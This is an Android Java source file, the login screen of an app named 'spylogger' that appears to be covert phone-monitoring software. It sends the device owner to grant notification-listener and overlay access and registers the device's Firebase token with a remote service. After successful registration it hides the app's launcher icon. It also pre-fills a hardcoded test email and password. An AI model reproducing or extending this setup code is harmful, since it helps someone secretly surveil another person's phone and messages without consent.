package com.gravatasufoca.spylogger.activities;

import android.animation.Animator;
import android.animation.AnimatorListenerAdapter;
import android.annotation.TargetApi;
import android.app.LoaderManager.LoaderCallbacks;
import android.app.Service;
import android.content.Context;
import android.content.CursorLoader;
import android.content.Intent;
import android.content.Loader;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Message;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.v4.app.NotificationManagerCompat;
import android.support.v7.app.AppCompatActivity;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.ArrayAdapter;
import android.widget.AutoCompleteTextView;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.google.firebase.iid.FirebaseInstanceId;
import com.gravatasufoca.spylogger.R;
import com.gravatasufoca.spylogger.dao.DatabaseHelper;
import com.gravatasufoca.spylogger.helpers.NetworkUtil;
import com.gravatasufoca.spylogger.helpers.TaskComplete;
import com.gravatasufoca.spylogger.model.Configuracao;
import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
import com.gravatasufoca.spylogger.services.SendUsuarioService;
import com.gravatasufoca.spylogger.utils.Utils;
import com.gravatasufoca.spylogger.vos.AparelhoVO;
import com.gravatasufoca.spylogger.vos.UsuarioVO;
import com.utilidades.gravata.utils.Utilidades;

import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;

/**
 * A login screen that offers login via email/password.
 */
public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<Cursor> {

    /**
     * Id to identity READ_CONTACTS permission request.
     */
    private static final int REQUEST_READ_CONTACTS = 0;

    /**
     * Keep track of the login task to ensure we can cancel it if requested.
     */
    private UserLoginTask mAuthTask = null;

    // UI references.
    private AutoCompleteTextView mEmailView;
    private EditText mPasswordView;
    private View mProgressView;
    private View mLoginFormView;

    private Context context;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);
        this.context = this;

        Utilidades.askPermissions(this, Utils.permissoes);

        if(!Utils.isRooted()) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
                boolean weHaveNotificationListenerPermission = false;
                for (String service : NotificationManagerCompat.getEnabledListenerPackages(this)) {
                    if (service.equals(getPackageName()))
                        weHaveNotificationListenerPermission = true;
                }
                if (!weHaveNotificationListenerPermission) {
                    //ask for permission
                    Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                    startActivity(intent);
                }
            }
        }

        if (Build.VERSION.SDK_INT >= 23) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, 1234);
            }
        } else {
            Intent intent = new Intent(this, Service.class);
            startService(intent);
        }

//        Utils.startService(getApplicationContext(), NotificationMonitor.class);

        if (NetworkUtil.NETWORK_STATUS_NOT_CONNECTED==NetworkUtil.getConnectivityStatusString(this)) {
            Toast.makeText(this, R.string.nao_conectado, Toast.LENGTH_LONG).show();
            finish();
        }

        // Set up the login form.
        mEmailView = (AutoCompleteTextView) findViewById(R.id.email);

        mPasswordView = (EditText) findViewById(R.id.password);

        Button mEmailSignInButton = (Button) findViewById(R.id.email_sign_in_button);
        mEmailSignInButton.setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View view) {
                attemptLogin();
            }
        });


        mLoginFormView = findViewById(R.id.login_form);
        mProgressView = findViewById(R.id.login_progress);
        mEmailView.setText("bruno@teste.com.br");
        mPasswordView.setText("teste");
    }

    /**
     * Callback received when a permissions request has been completed.
     */
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        if (requestCode == REQUEST_READ_CONTACTS) {
            if (grantResults.length == 1 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            }
        }
    }


    /**
     * Attempts to sign in or register the account specified by the login form.
     * If there are form errors (invalid email, missing fields, etc.), the
     * errors are presented and no actual login attempt is made.
     */
    private void attemptLogin() {
        if (mAuthTask != null) {
            return;
        }

        // Reset errors.
        mEmailView.setError(null);
        mPasswordView.setError(null);

        // Store values at the time of the login attempt.
        String email = mEmailView.getText().toString();
        String password = mPasswordView.getText().toString();

        boolean cancel = false;
        View focusView = null;

        // Check for a valid password, if the user entered one.
        if (!TextUtils.isEmpty(password) && !isPasswordValid(password)) {
            mPasswordView.setError(getString(R.string.error_invalid_password));
            focusView = mPasswordView;
            cancel = true;
        }

        // Check for a valid email address.
        if (TextUtils.isEmpty(email)) {
            mEmailView.setError(getString(R.string.error_field_required));
            focusView = mEmailView;
            cancel = true;
        } else if (!isEmailValid(email)) {
            mEmailView.setError(getString(R.string.error_invalid_email));
            focusView = mEmailView;
            cancel = true;
        }

        if (cancel) {
            // There was an error; don't attempt login and focus the first
            // form field with an error.
            focusView.requestFocus();
        } else {
            // Show a progress spinner, and kick off a background task to
            // perform the user login attempt.
            showProgress(true);
            mAuthTask = new UserLoginTask(email, password);
            mAuthTask.execute((Void) null);
        }
    }


    private boolean isEmailValid(String email) {
        //TODO: Replace this with your own logic
        return email.contains("@");
    }

    private boolean isPasswordValid(String password) {
        //TODO: Replace this with your own logic
        return password.length() > 4;
    }

    /**
     * Shows the progress UI and hides the login form.
     */
    @TargetApi(Build.VERSION_CODES.HONEYCOMB_MR2)
    private void showProgress(final boolean show) {
        // On Honeycomb MR2 we have the ViewPropertyAnimator APIs, which allow
        // for very easy animations. If available, use these APIs to fade-in
        // the progress spinner.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB_MR2) {
            int shortAnimTime = getResources().getInteger(android.R.integer.config_shortAnimTime);

            mLoginFormView.setVisibility(show ? View.GONE : View.VISIBLE);
            mLoginFormView.animate().setDuration(shortAnimTime).alpha(
                    show ? 0 : 1).setListener(new AnimatorListenerAdapter() {
                @Override
                public void onAnimationEnd(Animator animation) {
                    mLoginFormView.setVisibility(show ? View.GONE : View.VISIBLE);
                }
            });

            mProgressView.setVisibility(show ? View.VISIBLE : View.GONE);
            mProgressView.animate().setDuration(shortAnimTime).alpha(
                    show ? 1 : 0).setListener(new AnimatorListenerAdapter() {
                @Override
                public void onAnimationEnd(Animator animation) {
                    mProgressView.setVisibility(show ? View.VISIBLE : View.GONE);
                }
            });
        } else {
            // The ViewPropertyAnimator APIs are not available, so simply show
            // and hide the relevant UI components.
            mProgressView.setVisibility(show ? View.VISIBLE : View.GONE);
            mLoginFormView.setVisibility(show ? View.GONE : View.VISIBLE);
        }
    }

    @Override
    public Loader<Cursor> onCreateLoader(int i, Bundle bundle) {
        return new CursorLoader(this,
                // Retrieve data rows for the device user's 'profile' contact.
                Uri.withAppendedPath(ContactsContract.Profile.CONTENT_URI,
                        ContactsContract.Contacts.Data.CONTENT_DIRECTORY), ProfileQuery.PROJECTION,

                // Select only email addresses.
                ContactsContract.Contacts.Data.MIMETYPE +
                        " = ?", new String[]{ContactsContract.CommonDataKinds.Email
                .CONTENT_ITEM_TYPE},

                // Show primary email addresses first. Note that there won't be
                // a primary email address if the user hasn't specified one.
                ContactsContract.Contacts.Data.IS_PRIMARY + " DESC");
    }

    @Override
    public void onLoadFinished(Loader<Cursor> cursorLoader, Cursor cursor) {
        List<String> emails = new ArrayList<>();
        cursor.moveToFirst();
        while (!cursor.isAfterLast()) {
            emails.add(cursor.getString(ProfileQuery.ADDRESS));
            cursor.moveToNext();
        }

        addEmailsToAutoComplete(emails);
    }

    @Override
    public void onLoaderReset(Loader<Cursor> cursorLoader) {

    }

    private interface ProfileQuery {
        String[] PROJECTION = {
                ContactsContract.CommonDataKinds.Email.ADDRESS,
                ContactsContract.CommonDataKinds.Email.IS_PRIMARY,
        };

        int ADDRESS = 0;
    }


    private void addEmailsToAutoComplete(List<String> emailAddressCollection) {
        //Create adapter to tell the AutoCompleteTextView what to show in its dropdown list.
        ArrayAdapter<String> adapter =
                new ArrayAdapter<>(LoginActivity.this,
                        android.R.layout.simple_dropdown_item_1line, emailAddressCollection);

        mEmailView.setAdapter(adapter);
    }

    /**
     * Represents an asynchronous login/registration task used to authenticate
     * the user.
     */
    public class UserLoginTask extends AsyncTask<Void, Void, Boolean> implements TaskComplete {

        private final String mEmail;
        private final String mPassword;
        private RepositorioConfiguracao repositorioConfiguracao;
        private Configuracao configuracao;

        UserLoginTask(String email, String password) {
            mEmail = email;
            mPassword = password;
        }

        @Override
        protected Boolean doInBackground(Void... params) {
            // TODO: attempt authentication against a network service.

            try {
                DatabaseHelper dbHelper = new DatabaseHelper(getApplicationContext());
                dbHelper.getWritableDatabase();
                repositorioConfiguracao = new RepositorioConfiguracaoImpl(context);

                configuracao = repositorioConfiguracao.getConfiguracao();

                if (configuracao == null) {
                    dbHelper.criarConfiguracaoPadrao();
                    configuracao = repositorioConfiguracao.getConfiguracao();
                }

                if (configuracao != null) {

                    configuracao.setEmail(mEmail);

                    SendUsuarioService sendUsuarioService = new SendUsuarioService(context,this);

                    UsuarioVO usuarioVO = new UsuarioVO();

                    usuarioVO.setEmail(mEmail);
                    usuarioVO.setSenha(mPassword);

                    String token = FirebaseInstanceId.getInstance().getToken();
                    if (!TextUtils.isEmpty(token)) {
                        final AparelhoVO aparelhoVO = new AparelhoVO();
                        aparelhoVO.setChave(token);
                        aparelhoVO.setNome(android.os.Build.MODEL);
                        usuarioVO.setAparelho(aparelhoVO);
                    }

                    sendUsuarioService.inserirUsuario(usuarioVO);

                } else {
                    return false;
                }


            } catch (SQLException e) {
                return false;
            }

            return true;
        }

        @Override
        protected void onPostExecute(final Boolean success) {
            mAuthTask = null;
            showProgress(false);

            if (success) {
                // finish();
            } else {
                if (configuracao == null) {
                    mEmailView.setError(getString(R.string.com_error));
                } else {
                    mPasswordView.setError(getString(R.string.error_incorrect_password));
                    mPasswordView.requestFocus();
                }
            }
        }

        @Override
        protected void onCancelled() {
            mAuthTask = null;
            showProgress(false);
        }

        @Override
        public void onFinish(Object object) {
            if (object != null) {
                Message msg = (Message) object;
                switch (msg.what) {
                    case 404:
                        mEmailView.setError(getString(R.string.com_error));
                        break;
                    case 500:
                        mEmailView.setError((CharSequence) msg.obj);
                        break;
                    case 401:
                        mPasswordView.setError(getString(R.string.error_incorrect_password));
                        mPasswordView.requestFocus();
                        break;
                    case 200:
                        UsuarioVO usuarioVO = (UsuarioVO) msg.obj;
                        if (usuarioVO != null && usuarioVO.getAparelho() != null && usuarioVO.getAparelho().getId() != null) {
                            configuracao.setIdAparelho(usuarioVO.getAparelho().getId());
                            try {
                                repositorioConfiguracao.atualizar(configuracao);

                            } catch (SQLException e) {
                                Log.e("sql", e.getMessage());
                            }
                        }
//                        SendContatosService sendContatosService = new SendContatosService(getApplication(), null);
//                        sendContatosService.enviarContatos();

                        Utils.primeiroStart(getApplicationContext(), configuracao);
                        Utils.showIcon(false,getApplicationContext());
                        finish();
                        break;
                    default:
                        break;
                }
            }
        }
    }
}